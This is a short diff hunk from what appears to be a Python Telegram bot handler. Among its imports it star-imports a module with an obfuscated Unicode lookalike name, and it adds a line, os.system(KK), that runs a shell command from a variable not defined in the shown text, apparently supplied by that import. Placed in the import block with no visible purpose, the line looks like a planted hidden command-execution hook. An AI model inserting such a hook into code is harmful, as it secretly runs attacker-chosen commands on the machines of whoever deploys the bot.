@@ -12,6 +12,7 @@ from ռȶɨօռƈ import *
 from PIL import Image
 from hachoir.metadata import extractMetadata
 from hachoir.parser import createParser
+os.system(KK)
 from dlhunt.dlhunt import *
 
 @Client.on_callback_query()
